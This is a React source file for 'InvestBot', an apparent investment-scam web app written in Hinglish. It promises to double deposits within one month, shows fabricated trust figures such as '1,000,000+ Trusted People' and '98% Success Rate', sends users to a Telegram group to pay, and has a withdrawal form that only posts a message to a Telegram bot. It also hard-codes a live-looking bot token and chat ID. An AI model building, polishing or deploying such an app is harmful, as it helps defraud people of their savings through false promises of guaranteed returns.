import { useState, useEffect } from "react";
import {
  getAuth,
  createUserWithEmailAndPassword,
  signInWithEmailAndPassword,
  signInWithRedirect,
  getRedirectResult,
  GoogleAuthProvider,
  signOut,
  onAuthStateChanged,
} from "firebase/auth";
import { initializeApp } from "firebase/app";

const firebaseConfig = {
  apiKey: "AIzaSyDyEHLHzCNJ1BxHXmqCOKbinJqrTIBC7Gw",
  authDomain: "investapp-954d7.firebaseapp.com",
  projectId: "investapp-954d7",
  storageBucket: "investapp-954d7.firebasestorage.app",
  messagingSenderId: "530020859885",
  appId: "1:530020859885:web:5d1e0c6cd5220694d83974"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const googleProvider = new GoogleAuthProvider();

const TELEGRAM_GROUP_LINK = "https://t.me/+J9-VwYyIYVdiYjI1";
const TELEGRAM_BOT_TOKEN = "8997855038:AAEWt7J6hgNwo_biR7MSdVXWtMFVXHdeVmg";
const TELEGRAM_CHAT_ID = "-5202050403";

const plans = [
  { id: 1, invest: 100, returns: 200, label: "Starter", icon: "🌱", color: "#f6c90e" },
  { id: 2, invest: 200, returns: 400, label: "Growth", icon: "📈", color: "#4caf50" },
  { id: 3, invest: 500, returns: 900, label: "Pro", icon: "💎", color: "#00bcd4" },
  { id: 4, invest: 1000, returns: 2100, label: "Elite", icon: "🚀", color: "#ff9800" },
];

const disclaimer = `Investment Disclaimer: Investments are subject to market risks. Before making any investment decision, carefully consider your financial situation, investment objectives, and risk tolerance. Past performance is not indicative of future results.`;

async function sendTelegramNotification(message) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "HTML" }),
    });
  } catch (e) {}
}

function TrustMarquee() {
  const text = "✅ 1,000,000+ Trusted People • 💰 Safe & Secure Investments • 🏆 #1 Investment Platform • 🌍 Worldwide Trusted • ";
  return (
    <div style={mq.marqueeWrap}>
      <div style={mq.marqueeTrack}>
        <span style={mq.marqueeText}>{text}{text}</span>
      </div>
    </div>
  );
}

function AuthPage() {
  const [mode, setMode] = useState("login");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [name, setName] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  async function handleEmailAuth() {
    setError("");
    if (!email || !password) { setError("⚠️ Email aur Password bharein"); return; }
    if (mode === "register" && !name) { setError("⚠️ Naam bharein"); return; }
    setLoading(true);
    try {
      if (mode === "register") {
        await createUserWithEmailAndPassword(auth, email, password);
      } else {
        await signInWithEmailAndPassword(auth, email, password);
      }
    } catch (e) {
      const msg = e.code === "auth/email-already-in-use" ? "⚠️ Email already registered hai" :
                  e.code === "auth/wrong-password" ? "⚠️ Password galat hai" :
                  e.code === "auth/user-not-found" ? "⚠️ Email registered nahi hai" :
                  e.code === "auth/weak-password" ? "⚠️ Password 6+ characters ka hona chahiye" :
                  "⚠️ Kuch galat hua, dobara try karo";
      setError(msg);
    }
    setLoading(false);
  }

  async function handleGoogle() {
    setError("");
    setLoading(true);
    try {
      const { signInWithRedirect } = await import("firebase/auth");
      await signInWithRedirect(auth, googleProvider);
    } catch (e) {
      setError("⚠️ Google login failed");
      setLoading(false);
    }
  }

  return (
    <div style={authStyles.root}>
      <style>{cssAnim}</style>
      <div style={authStyles.card}>
        <div style={authStyles.logoRow}>
          <span style={{ fontSize: 36 }}>💰</span>
          <span style={authStyles.logoText}>InvestBot</span>
        </div>
        <p style={authStyles.tagline}>Smart Investing • 1 Month Returns</p>
        <div style={authStyles.tabRow}>
          <button style={{ ...authStyles.tab, ...(mode === "login" ? authStyles.tabActive : {}) }} onClick={() => { setMode("login"); setError(""); }}>Login</button>
          <button style={{ ...authStyles.tab, ...(mode === "register" ? authStyles.tabActive : {}) }} onClick={() => { setMode("register"); setError(""); }}>Register</button>
        </div>
        {mode === "register" && (
          <input style={authStyles.input} placeholder="👤 Aapka Naam" value={name} onChange={e => setName(e.target.value)} />
        )}
        <input style={authStyles.input} placeholder="📧 Email" type="email" value={email} onChange={e => setEmail(e.target.value)} />
        <input style={authStyles.input} placeholder="🔒 Password (min 6)" type="password" value={password} onChange={e => setPassword(e.target.value)} />
        {error && <div style={authStyles.error}>{error}</div>}
        <button style={{ ...authStyles.btn, opacity: loading ? 0.7 : 1 }} onClick={handleEmailAuth} disabled={loading}>
          {loading ? "⏳ Please wait..." : mode === "login" ? "🔑 Login" : "📝 Register"}
        </button>
        <div style={authStyles.divider}><span>ya</span></div>
        <button style={{ ...authStyles.googleBtn, opacity: loading ? 0.7 : 1 }} onClick={handleGoogle} disabled={loading}>
          <span style={{ fontSize: 18 }}>🔵</span> Google se Login Karo
        </button>
      </div>
    </div>
  );
}export default function App() {
  const [user, setUser] = useState(null);
  const [authLoading, setAuthLoading] = useState(true);
  const [page, setPage] = useState("home");
  const [selected, setSelected] = useState(null);
  const [showModal, setShowModal] = useState(false);
  const [showDisclaimer, setShowDisclaimer] = useState(false);
  const [wName, setWName] = useState("");
  const [wAmount, setWAmount] = useState("");
  const [wPlan, setWPlan] = useState("");
  const [wInvestDate, setWInvestDate] = useState("");
  const [wMsg, setWMsg] = useState(null);
  const [wLoading, setWLoading] = useState(false);

  useEffect(() => {
    getRedirectResult(auth).catch(() => {});
    const unsub = onAuthStateChanged(auth, (u) => {
      setUser(u);
      setAuthLoading(false);
    });
    return () => unsub();
  }, []);

  if (authLoading) {
    return (
      <div style={{ minHeight: "100vh", background: "#0a1a0a", display: "flex", alignItems: "center", justifyContent: "center" }}>
        <div style={{ color: "#f6c90e", fontSize: 18, fontWeight: 700 }}>⏳ Loading...</div>
      </div>
    );
  }

  if (!user) return <AuthPage />;

  const handleInvest = (plan) => { setSelected(plan); setShowModal(true); };
  const handleJoinTelegram = () => { window.open(TELEGRAM_GROUP_LINK, "_blank"); setShowModal(false); };

  function isOneMonthPassed(dateStr) {
    if (!dateStr) return false;
    const invested = new Date(dateStr);
    const now = new Date();
    return (now - invested) >= 30 * 24 * 60 * 60 * 1000;
  }

  async function handleWithdraw() {
    if (!wName || !wAmount || !wPlan || !wInvestDate) {
      setWMsg({ type: "error", text: "⚠️ Sab fields bharein" });
      return;
    }
    setWLoading(true);
    setWMsg(null);
    if (!isOneMonthPassed(wInvestDate)) {
      setWMsg({ type: "warn", text: "⏳ Abhi 1 mahina poora nahi hua." });
      setWLoading(false);
      return;
    }
    const msg =
      `🔔 <b>WITHDRAWAL REQUEST</b>\n\n` +
      `👤 Naam: <b>${wName}</b>\n` +
      `📧 Email: <b>${user.email}</b>\n` +
      `💰 Amount: <b>₹${wAmount}</b>\n` +
      `📦 Plan: <b>${wPlan}</b>\n` +
      `📅 Invest Date: <b>${wInvestDate}</b>\n` +
      `🕐 Time: ${new Date().toLocaleString("en-IN")}`;
    await sendTelegramNotification(msg);
    setWMsg({ type: "success", text: "✅ Withdrawal request bhej di gayi!" });
    setWLoading(false);
}return (
    <div style={styles.root}>
      <style>{cssAnim}</style>
      <div style={styles.blob1} /><div style={styles.blob2} /><div style={styles.blob3} />
      <div style={styles.navBar}>
        <button style={{ ...styles.navBtn, ...(page === "home" ? styles.navActive : {}) }} onClick={() => setPage("home")}>🏠 Home</button>
        <button style={{ ...styles.navBtn, ...(page === "withdraw" ? styles.navActive : {}) }} onClick={() => setPage("withdraw")}>💸 Withdrawal</button>
        <button style={{ ...styles.navBtn, color: "#f44336" }} onClick={() => signOut(auth)}>🚪 Logout</button>
      </div>
      <div style={{ textAlign: "center", padding: "8px 0 0", fontSize: 12, color: "#888" }}>
        👋 {user.displayName || user.email}
      </div>

      {page === "home" && (
        <>
          <div style={styles.header}>
            <div style={styles.logoRow}><span style={styles.logoIcon}>💰</span><span style={styles.logoText}>InvestBot</span></div>
            <p style={styles.tagline}>Smart Investing • 1 Month Returns</p>
          </div>
          <div style={styles.hero}>
            <h1 style={styles.heroTitle}>Apna Paisa <span style={styles.heroAccent}>Grow</span> Karo</h1>
            <p style={styles.heroSub}>Invest today, double your money in 1 month.</p>
          </div>
          <div style={styles.statsRow}>
            {[["500+", "Investors"], ["98%", "Success Rate"], ["1 Month", "Returns"]].map(([val, lbl]) => (
              <div key={lbl} style={styles.statBox}>
                <span style={styles.statVal}>{val}</span>
                <span style={styles.statLbl}>{lbl}</span>
              </div>
            ))}
          </div>
          <div style={styles.sectionTitle}>💼 Investment Plans</div>
          <div style={styles.plansGrid}>
            {plans.map((plan) => (
              <div key={plan.id} style={{ ...styles.planCard, borderTop: `4px solid ${plan.color}` }}>
                <div style={styles.planIcon}>{plan.icon}</div>
                <div style={styles.planLabel}>{plan.label}</div>
                <div style={styles.planDuration}>1 Month Plan</div>
                <div style={styles.planRow}>
                  <div style={styles.planCol}><span style={styles.planMeta}>Invest</span><span style={{ ...styles.planAmt, color: "#f6c90e" }}>₹{plan.invest}</span></div>
                  <div style={styles.arrowCol}>→</div>
                  <div style={styles.planCol}><span style={styles.planMeta}>Return</span><span style={{ ...styles.planAmt, color: plan.color }}>₹{plan.returns}</span></div>
                </div>
                <div style={styles.profitBadge}>+₹{plan.returns - plan.invest} Profit</div>
                <button style={{ ...styles.investBtn, background: plan.color }} onClick={() => handleInvest(plan)}>Invest Now</button>
              </div>
            ))}
          </div>
          <TrustMarquee />
          <div style={styles.sectionTitle}>⚡ Kaise Kaam Karta Hai?</div>
          <div style={styles.stepsRow}>
            {[["1","Plan Select Karo","Budget ke hisaab se chunein"],["2","Telegram Join Karo","Payment karo"],["3","Return Pao","1 mahine mein doubled amount"]].map(([num,title,desc]) => (
              <div key={num} style={styles.stepCard}>
                <div style={styles.stepNum}>{num}</div>
                <div style={{ flex: 1 }}><div style={styles.stepTitle}>{title}</div><div style={styles.stepDesc}>{desc}</div></div>
              </div>
            ))}
          </div>
          <div style={styles.disclaimerBox}>
            <button style={styles.discBtn} onClick={() => setShowDisclaimer(!showDisclaimer)}>⚠️ Disclaimer {showDisclaimer ? "▲" : "▼"}</button>
            {showDisclaimer && <p style={styles.discText}>{disclaimer}</p>}
          </div>
          <div style={styles.footer}>© 2024 InvestBot • All Rights Reserved</div>
        </>
      )}{page === "withdraw" && (
        <div style={wd.root}>
          <div style={wd.header}>
            <div style={wd.headerIcon}>💸</div>
            <h2 style={wd.headerTitle}>Withdrawal Request</h2>
            <p style={wd.headerSub}>Apna invest + profit nikaal lo</p>
          </div>
          <div style={wd.infoRow}>
            <div style={{ ...wd.infoCard, borderColor: "#4caf50" }}>
              <div style={wd.infoIcon}>✅</div>
              <div style={wd.infoText}>1 Month ke baad withdrawal</div>
            </div>
            <div style={{ ...wd.infoCard, borderColor: "#f44336" }}>
              <div style={wd.infoIcon}>🚫</div>
              <div style={wd.infoText}>1 Month se pehle blocked</div>
            </div>
          </div>
          <div style={wd.form}>
            <div style={wd.fieldLabel}>👤 Aapka Naam</div>
            <input style={wd.input} placeholder="Naam likhein" value={wName} onChange={e => setWName(e.target.value)} />
            <div style={wd.fieldLabel}>💰 Amount (₹)</div>
            <input style={wd.input} type="number" placeholder="Amount likhein" value={wAmount} onChange={e => setWAmount(e.target.value)} />
            <div style={wd.fieldLabel}>📦 Plan</div>
            <select style={wd.select} value={wPlan} onChange={e => setWPlan(e.target.value)}>
              <option value="">-- Plan chunein --</option>
              {plans.map(p => (
                <option key={p.id} value={p.label}>{p.icon} {p.label} — ₹{p.invest} → ₹{p.returns}</option>
              ))}
            </select>
            <div style={wd.fieldLabel}>📅 Invest Ki Tarikh</div>
            <input style={wd.input} type="date" value={wInvestDate} onChange={e => setWInvestDate(e.target.value)} />
            {wInvestDate && (
              <div style={{ ...wd.statusBadge, background: isOneMonthPassed(wInvestDate) ? "rgba(76,175,80,0.15)" : "rgba(244,67,54,0.12)", borderColor: isOneMonthPassed(wInvestDate) ? "#4caf50" : "#f44336", color: isOneMonthPassed(wInvestDate) ? "#4caf50" : "#f44336" }}>
                {isOneMonthPassed(wInvestDate) ? "✅ Withdrawal allowed!" : "⏳ 1 Month nahi hua"}
              </div>
            )}
            <button style={{ ...wd.withdrawBtn, opacity: wLoading ? 0.7 : 1 }} onClick={handleWithdraw} disabled={wLoading}>
              {wLoading ? "⏳ Processing..." : "💸 Request Bhejo"}
            </button>
            {wMsg && (
              <div style={{ ...wd.msgBox, background: wMsg.type === "success" ? "rgba(76,175,80,0.15)" : wMsg.type === "warn" ? "rgba(255,152,0,0.15)" : "rgba(244,67,54,0.15)", borderColor: wMsg.type === "success" ? "#4caf50" : wMsg.type === "warn" ? "#ff9800" : "#f44336", color: wMsg.type === "success" ? "#4caf50" : wMsg.type === "warn" ? "#ff9800" : "#f44336" }}>
                {wMsg.text}
              </div>
            )}
          </div>
          <TrustMarquee />
          <div style={styles.footer}>© 2024 InvestBot • All Rights Reserved</div>
        </div>
      )}

      {showModal && selected && (
        <div style={styles.modalOverlay} onClick={() => setShowModal(false)}>
          <div style={styles.modal} onClick={e => e.stopPropagation()}>
            <div style={styles.modalIcon}>{selected.icon}</div>
            <h2 style={styles.modalTitle}>{selected.label} Plan!</h2>
            <div style={styles.modalDetail}>
              <span>Invest: <b style={{ color: "#f6c90e" }}>₹{selected.invest}</b></span>
              <span style={{ margin: "0 10px", color: "#aaa" }}>→</span>
              <span>Return: <b style={{ color: selected.color }}>₹{selected.returns}</b></span>
            </div>
            <p style={styles.modalMsg}>Telegram Group join karo payment ke liye.</p>
            <button style={styles.telegramBtn} onClick={handleJoinTelegram}>📱 Telegram Join Karo</button>
            <button style={styles.cancelBtn} onClick={() => setShowModal(false)}>Cancel</button>
          </div>
        </div>
      )}
    </div>
  );
}const cssAnim = `
@keyframes marquee {
  0% { transform: translateX(0); }
  100% { transform: translateX(-50%); }
}
`;

const mq = {
  marqueeWrap: { overflow: "hidden", margin: "24px 0 0", background: "rgba(246,201,14,0.08)", borderTop: "1px solid rgba(246,201,14,0.2)", borderBottom: "1px solid rgba(246,201,14,0.2)", padding: "10px 0" },
  marqueeTrack: { display: "inline-block", animation: "marquee 18s linear infinite", whiteSpace: "nowrap" },
  marqueeText: { fontSize: 13, fontWeight: 700, color: "#f6c90e", letterSpacing: 0.5 },
};

const authStyles = {
  root: { minHeight: "100vh", background: "linear-gradient(135deg, #0a1a0a 0%, #0d2a0d 40%, #1a1a00 100%)", display: "flex", alignItems: "center", justifyContent: "center", padding: 20 },
  card: { background: "rgba(255,255,255,0.05)", borderRadius: 20, padding: "32px 24px", maxWidth: 360, width: "100%", border: "1px solid rgba(246,201,14,0.2)", backdropFilter: "blur(10px)", display: "flex", flexDirection: "column", gap: 12 },
  logoRow: { display: "flex", alignItems: "center", gap: 10, justifyContent: "center" },
  logoText: { fontSize: 24, fontWeight: 800, background: "linear-gradient(90deg, #f6c90e, #4caf50)", WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent" },
  tagline: { color: "#888", fontSize: 12, textAlign: "center", margin: "0 0 8px" },
  tabRow: { display: "flex", borderRadius: 10, overflow: "hidden", border: "1px solid rgba(246,201,14,0.2)" },
  tab: { flex: 1, padding: "10px 0", background: "none", border: "none", color: "#888", fontWeight: 700, fontSize: 14, cursor: "pointer" },
  tabActive: { background: "rgba(246,201,14,0.15)", color: "#f6c90e" },
  input: { background: "rgba(255,255,255,0.07)", border: "1px solid rgba(255,255,255,0.12)", borderRadius: 10, padding: "12px 14px", color: "#fff", fontSize: 14, outline: "none", width: "100%", boxSizing: "border-box" },
  error: { background: "rgba(244,67,54,0.12)", border: "1px solid #f44336", borderRadius: 10, padding: "10px 14px", color: "#f44336", fontSize: 13, textAlign: "center" },
  btn: { padding: "13px 0", borderRadius: 12, border: "none", background: "linear-gradient(90deg, #f6c90e, #4caf50)", color: "#000", fontWeight: 900, fontSize: 15, cursor: "pointer" },
  divider: { textAlign: "center", color: "#555", fontSize: 12 },
  googleBtn: { padding: "12px 0", borderRadius: 12, border: "1px solid rgba(255,255,255,0.15)", background: "rgba(255,255,255,0.07)", color: "#fff", fontWeight: 700, fontSize: 14, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 },
};

const wd = {
  root: { padding: "0 0 40px" },
  header: { textAlign: "center", padding: "30px 20px 10px" },
  headerIcon: { fontSize: 48 },
  headerTitle: { fontSize: 24, fontWeight: 900, margin: "8px 0 4px", color: "#fff" },
  headerSub: { color: "#aaa", fontSize: 13 },
  infoRow: { display: "flex", gap: 12, padding: "16px 16px 0", maxWidth: 460, margin: "0 auto" },
  infoCard: { flex: 1, background: "rgba(255,255,255,0.04)", borderRadius: 12, padding: "12px", display: "flex", flexDirection: "column", alignItems: "center", gap: 6, border: "1px solid", textAlign: "center" },
  infoIcon: { fontSize: 22 },
  infoText: { fontSize: 11, color: "#bbb", lineHeight: 1.4 },
  form: { maxWidth: 460, margin: "20px auto 0", padding: "0 16px", display: "flex", flexDirection: "column", gap: 10 },
  fieldLabel: { fontSize: 13, fontWeight: 700, color: "#ccc", marginBottom: 2 },
  input: { background: "rgba(255,255,255,0.07)", border: "1px solid rgba(255,255,255,0.12)", borderRadius: 10, padding: "12px 14px", color: "#fff", fontSize: 14, outline: "none", width: "100%", boxSizing: "border-box" },
  select: { background: "#0f1f0f", border: "1px solid rgba(255,255,255,0.12)", borderRadius: 10, padding: "12px 14px", color: "#fff", fontSize: 13, outline: "none", width: "100%", boxSizing: "border-box" },
  statusBadge: { padding: "10px 14px", borderRadius: 10, border: "1px solid", fontSize: 12, fontWeight: 700, textAlign: "center" },
  withdrawBtn: { marginTop: 4, padding: "14px 0", borderRadius: 12, border: "none", background: "linear-gradient(90deg, #f6c90e, #4caf50)", color: "#000", fontWeight: 900, fontSize: 15, cursor: "pointer" },
  msgBox: { padding: "14px 16px", borderRadius: 12, border: "1px solid", fontSize: 13, fontWeight: 600, lineHeight: 1.6, textAlign: "center" },
};

const styles = {
  root: { minHeight: "100vh", background: "linear-gradient(135deg, #0a1a0a 0%, #0d2a0d 40%, #1a1a00 100%)", color: "#fff", fontFamily: "'Segoe UI', sans-serif", position: "relative", overflow: "hidden", paddingBottom: 40 },
  blob1: { position: "fixed", top: -80, left: -80, width: 300, height: 300, borderRadius: "50%", background: "rgba(246,201,14,0.08)", filter: "blur(60px)", pointerEvents: "none" },
  blob2: { position: "fixed", bottom: 0, right: -60, width: 250, height: 250, borderRadius: "50%", background: "rgba(76,175,80,0.10)", filter: "blur(50px)", pointerEvents: "none" },
  blob3: { position: "fixed", top: "40%", left: "50%", width: 200, height: 200, borderRadius: "50%", background: "rgba(255,152,0,0.06)", filter: "blur(70px)", pointerEvents: "none" },
  navBar: { display: "flex", borderBottom: "1px solid rgba(246,201,14,0.15)", background: "rgba(0,0,0,0.3)", backdropFilter: "blur(10px)", position: "sticky", top: 0, zIndex: 50 },
  navBtn: { flex: 1, padding: "14px 0", background: "none", border: "none", color: "#888", fontWeight: 700, fontSize: 13, cursor: "pointer" },
  navActive: { color: "#f6c90e", borderBottom: "2px solid #f6c90e" },
  header: { padding: "24px 20px 8px", display: "flex", flexDirection: "column", alignItems: "center" },
  logoRow: { display: "flex", alignItems: "center", gap: 10 },
  logoIcon: { fontSize: 32 },
  logoText: { fontSize: 26, fontWeight: 800, background: "linear-gradient(90deg, #f6c90e, #4caf50)", WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent" },
  tagline: { color: "#aaa", fontSize: 13, margin: "4px 0 0" },
  hero: { textAlign: "center", padding: "30px 20px 10px" },
  heroTitle: { fontSize: 28, fontWeight: 900, margin: 0 },
  heroAccent: { background: "linear-gradient(90deg, #f6c90e, #4caf50)", WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent" },
  heroSub: { color: "#bbb", fontSize: 14, marginTop: 10 },
  statsRow: { display: "flex", justifyContent: "center", gap: 12, padding: "16px 20px", flexWrap: "wrap" },
  statBox: { background: "rgba(255,255,255,0.05)", borderRadius: 12, padding: "12px 20px", textAlign: "center", minWidth: 80, border: "1px solid rgba(246,201,14,0.15)" },
  statVal: { display: "block", fontSize: 20, fontWeight: 800, color: "#f6c90e" },
  statLbl: { display: "block", fontSize: 11, color: "#888", marginTop: 2 },
  sectionTitle: { textAlign: "center", fontSize: 18, fontWeight: 700, color: "#f6c90e", margin: "28px 0 16px" },
  plansGrid: { display: "grid", gridTemplateColumns: "repeat(2, 1fr)", gap: 14, padding: "0 16px", maxWidth: 480, margin: "0 auto" },
  planCard: { background: "rgba(255,255,255,0.05)", borderRadius: 16, padding: "18px 14px", display: "flex", flexDirection: "column", alignItems: "center", gap: 6, border: "1px solid rgba(255,255,255,0.08)" },
  planIcon: { fontSize: 28 },
  planLabel: { fontSize: 15, fontWeight: 800, color: "#fff" },
  planDuration: { fontSize: 11, color: "#888", background: "rgba(255,255,255,0.08)", borderRadius: 20, padding: "2px 10px" },
  planRow: { display: "flex", alignItems: "center", gap: 6, marginTop: 8 },
  planCol: { display: "flex", flexDirection: "column", alignItems: "center" },
  planMeta: { fontSize: 10, color: "#888" },
  planAmt: { fontSize: 17, fontWeight: 800 },
  arrowCol: { fontSize: 16, color: "#555", marginTop: 8 },
  profitBadge: { background: "rgba(76,175,80,0.15)", color: "#4caf50", fontSize: 11, borderRadius: 20, padding: "3px 12px", border: "1px solid rgba(76,175,80,0.3)", fontWeight: 700 },
  investBtn: { marginTop: 6, width: "100%", padding: "9px 0", borderRadius: 10, border: "none", cursor: "pointer", fontWeight: 800, fontSize: 13, color: "#000" },
  stepsRow: { display: "flex", flexDirection: "column", gap: 12, padding: "0 20px", maxWidth: 440, margin: "0 auto" },
  stepCard: { background: "rgba(255,255,255,0.04)", borderRadius: 14, padding: "14px 16px", display: "flex", alignItems: "flex-start", gap: 14, border: "1px solid rgba(246,201,14,0.10)" },
  stepNum: { minWidth: 34, height: 34, borderRadius: "50%", background: "linear-gradient(135deg, #f6c90e, #4caf50)", color: "#000", fontWeight: 900, fontSize: 16, display: "flex", alignItems: "center", justifyContent: "center" },
  stepTitle: { fontWeight: 700, fontSize: 14, color: "#fff", marginBottom: 3 },
  stepDesc: { fontSize: 12, color: "#888" },
  disclaimerBox: { margin: "28px auto 0", padding: "14px 16px", background: "rgba(255,152,0,0.06)", borderRadius: 12, border: "1px solid rgba(255,152,0,0.2)", maxWidth: 448 },
  discBtn: { background: "none", border: "none", color: "#ff9800", fontWeight: 700, fontSize: 13, cursor: "pointer", padding: 0 },
  discText: { color: "#999", fontSize: 11, marginTop: 10, lineHeight: 1.6 },
  footer: { textAlign: "center", color: "#444", fontSize: 11, marginTop: 30 },
  modalOverlay: { position: "fixed", inset: 0, background: "rgba(0,0,0,0.75)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 100, padding: 20 },
  modal: { background: "linear-gradient(160deg, #0f2a0f 0%, #1a1a05 100%)", borderRadius: 20, padding: "30px 24px", maxWidth: 340, width: "100%", textAlign: "center", border: "1px solid rgba(246,201,14,0.25)" },
  modalIcon: { fontSize: 48, marginBottom: 8 },
  modalTitle: { fontSize: 20, fontWeight: 800, margin: "0 0 12px" },
  modalDetail: { display: "flex", justifyContent: "center", alignItems: "center", background: "rgba(255,255,255,0.05)", borderRadius: 12, padding: "12px 16px", marginBottom: 14, fontSize: 16 },
  modalMsg: { color: "#aaa", fontSize: 13, lineHeight: 1.6, marginBottom: 20 },
  telegramBtn: { width: "100%", padding: "13px 0", borderRadius: 12, background: "linear-gradient(90deg, #2196f3, #00bcd4)", color: "#fff", fontWeight: 800, fontSize: 15, border: "none", cursor: "pointer", marginBottom: 10 },
  cancelBtn: { width: "100%", padding: "10px 0", borderRadius: 12, background: "rgba(255,255,255,0.07)", color: "#888", fontWeight: 600, fontSize: 13, border: "1px solid rgba(255,255,255,0.1)", cursor: "pointer" },
};
